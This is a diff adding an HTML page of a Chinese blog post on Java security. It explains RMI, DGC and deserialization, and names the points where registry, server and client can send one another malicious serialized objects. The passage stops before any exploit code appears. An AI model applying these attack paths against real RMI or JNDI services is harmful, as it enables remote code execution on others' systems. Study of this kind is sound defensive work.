@@ -1,0 +1,970 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            RMI JRMP JEP290 LDAP基础梳理 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        RMI JRMP JEP290 LDAP基础梳理
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-11-10 16:08:01</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Nov 10 2025 16:12:18 GMT+0800">2025-11-10 16:12:18</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>7.7k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>37 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>网上有很多文章都讲过RMI，JRMP，JEP290 。但是每篇文章总有一些没涉及的，或是有一些讲得过分详细。这里我读了很多前辈的文章，并提取出相对简练的内容，帮助自己更好地了解JNDI的相关知识。</p>
+<p>这里的目标是：</p>
+<p>1、搞清楚RMI的通信流程，搞清楚Server，Registry，Client三者互相的打法</p>
+<p>2、了解JRMP在RMI中的作用，知道它和DGC的关系</p>
+<p>3、了解两次JEP290的防护和绕过，JEP290(8u121~8u230)，JEP290(&gt;8u231)</p>
+<p>4、了解JNDI的基本打法，包括codebase远程加载，ldap发送反序列化数据，reference本地工厂(BeanFactory为例)</p>
+<h1 id="RMI通信流程"><a href="#RMI通信流程" class="headerlink" title="RMI通信流程"></a>RMI通信流程</h1><h2 id="RMI简介"><a href="#RMI简介" class="headerlink" title="RMI简介"></a>RMI简介</h2><p>RMI是 Remote Method Invocation的缩写，java中远程方法调用，主要是为了让java中的方法和对象能被远程调用，跨JVM调用，其是基于JRMP协议的。类比于RPC远程过程调用，c语言里面C 程序员一直使用远程过程调用 (RPC) 在远程主机上执行 C 函数并返回结果。这里JRMP是结合java特性（面向对象）设置的”RPC”。</p>
+<p>RMI通信中，有三个部分：Registry，Server，Client。下面就围绕三者的通信展开。</p>
+<h2 id="Registry创建"><a href="#Registry创建" class="headerlink" title="Registry创建"></a>Registry创建</h2><p>注册中心的创建很简单，只需要一行代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    java.rmi.registry.<span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就能在1099端口开启一个Registry。</p>
+<h2 id="Server绑定对象"><a href="#Server绑定对象" class="headerlink" title="Server绑定对象"></a>Server绑定对象</h2><p>先在服务端创建远程对象</p>
+<p>接口：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> remoteObj;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实现：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> remoteObj;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着将远程对象绑定到注册中心：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> remoteObj.HelloImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">HelloImpl</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>网上有很多文章，会把注册中心创建和远程对象绑定放到同一段代码，因为这样才能保证Registry能持续开启。这里我将其分开，这样能更好地区别Registry和Server。</p>
+<h3 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h3><p>在Server端进行bind操作时，会发生：</p>
+<p>1、Server发送一段序列化数据到Registry，这段序列化数据并不是远程对象本身，而是远程对象的一个stub(存根)。而存根里有一个字段，里面记录了ip+端口，而这个ip+端口，才是远程对象真正的位置，也就是位于Server端的远程对象，这个地址存放的对象，我们称作skel(骨根)。</p>
+<p>这两个词都很形象，Server端拥有远程对象本身，也就是拥有骨根；Registry只有远程对象的地址信息，只拥有存根。</p>
+<p>2、Registry收到序列化数据，进行反序列化来获得存根。得到存根后，Registry也会进行回复，而回复的对象也是序列化数据。</p>
+<p>3、Registry解析得到存根里的骨根地址，并向骨根，也就是Server，发送一次dgc dirty请求，这个请求也是以序列化的形式发送的。</p>
+<p>4、收到dgc dirty请求后，Server会回答一个lease对象给Registry，当然也是以序列化形式。</p>
+<p>bind过程流程图：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762672802306-d1b8ad9f-849b-4ec3-b62c-60a9d1578b65.png"  alt="img"></p>
+<p>这里来介绍一下DGC。</p>
+<h3 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h3><p>dgc全称distributed garbage-collection，是java中支撑远程方法调用设计的一套垃圾回收协议，Dgc里面就两个方法，一个叫clean 一个叫dirty。</p>
+<p>简单来说就是，当DGC中的客户端不需要存根的时候，就要调用clean方法，以便DGC的服务端可以回收相关垃圾。当DGC中的客户端持有某个存根或者需要持续的使用存根的时候，就要调用dirty方法，从而让DGC的服务端知道，客户端在使用，不能回收。除此之外使用dirty方法之后，会收到一个lease响应，这个lease里面会有一些时间的期限类的东西，超过期限还没有收到下一次的dirty请求，这个对象就会被回收。</p>
+<p>除此之外，这还有一个要点：</p>
+<p>传输内容的格式，传输对象的内容都是以序列化的形式出现在流量中。</p>
+<p>在上面的过程中，Server就是DGC服务端，Registry就是DGC客户端。</p>
+<h3 id="反序列化小结"><a href="#反序列化小结" class="headerlink" title="反序列化小结"></a>反序列化小结</h3><p>总结一下Server端绑定远程对象时，哪里会触发反序列化。</p>
+<p>1、bind的时候，server端发送序列化数据给registry。正常情况下，registry反序列化得到stub。如果bind一个恶意对象，理论上能实现server打registry</p>
+<p>2、得到stub后，registry要回复server，也是序列化数据，所以这里理论上能registry打server</p>
+<p>3、registry解析stub后，获取skel地址，发送dgc dirty请求，也是序列化形式，这里理论上能registry打server</p>
+<p>4、server收到dgc dirty请求后，会返回一个lease对象，如果返回的是恶意对象，理论上能server打registry</p>
+<p>这里也能看出，server和registry能互相打，所以才会有“打别人，自己反被getshell”的说法。</p>
+<h2 id="Client查找对象"><a href="#Client查找对象" class="headerlink" title="Client查找对象"></a>Client查找对象</h2><p>先开启注册中心：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> remoteObj.HelloImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Registry</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        java.rmi.registry.<span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloImpl</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着使用Client调用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> remoteObj.Hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello.hello(<span class="string">&quot;max&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，这里要求Client也存在Hello接口。</p>
+<h3 id="lookup"><a href="#lookup" class="headerlink" title="lookup"></a>lookup</h3><p>1、client发送序列化后的String对象</p>
+<p>2、registry反序列化得到String，根据String名称，找到相应的stub，序列化后返回给client</p>
+<p>3、client反序列化得到stub，解析得到skel，向server发送dgc dirty请求</p>
+<p>4、server收到dgc dirty请求，回复lease对象给client</p>
+<p>5、client将方法参数序列化，发送给server</p>
+<p>6、server执行远程方法，得到结果，序列化后发送给client</p>
+<p>7、client反序列化数据，得到方法执行结果</p>
+<p>lookup流程图：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762672419214-e2ddf6a2-51fb-4a88-9cab-04f902b45da7.png"  alt="img"></p>
+<h3 id="反序列化小结-1"><a href="#反序列化小结-1" class="headerlink" title="反序列化小结"></a>反序列化小结</h3><p>同样总结一下上面流程中的反序列化点。</p>
+<p>1、client lookup，发送String给registry来查找stub。这里虽然限制发送的对象为String，但是我们可以通过debug的方式，在调试过程中修改对象，然后让registry反序列化恶意对象。所以理论上能client打registry</p>
+<p>2、registry序列化stub后，发送给client，client会直接反序列化。所以这里构造恶意registry就能实现registry打client。这也是常用的一种绕过。java-chains里也有实现：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762673120108-22de1436-3490-4fab-bb86-a72dac6ca96f.png"  alt="img"></p>
+<p>3、client解析stub，获取skel地址后，会发送dgc dirty请求，这里理论上可以client打server</p>
+<p>4、server收到dgc dirty请求后，会返回lease对象，替换成恶意对象，理论上就能server打client</p>
+<p>5、client向远程方法中填入参数，序列化后发送给server。原本方法的参数类型是固定的，但是仍可以通过debug的方式动态修改。理论上能client打server。</p>
+<p>6、server执行远程方法调用后，将结果返回给client，这里返回恶意对象的话，就能server打client</p>
+<h1 id="RMI攻击演示-源码分析"><a href="#RMI攻击演示-源码分析" class="headerlink" title="RMI攻击演示&amp;源码分析"></a>RMI攻击演示&amp;源码分析</h1><p>jdk8u65环境下演示。</p>
+<p>pom.xml：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.test<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>JNDI<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.47<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.30.2-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="bind-1"><a href="#bind-1" class="headerlink" title="bind"></a>bind</h2><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>这里演示怎么通过bind实现server打registry</p>
+<p>准备一个registry：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> remoteObj.HelloImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Registry</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        java.rmi.registry.<span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloImpl</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>bind一个恶意对象：</p>
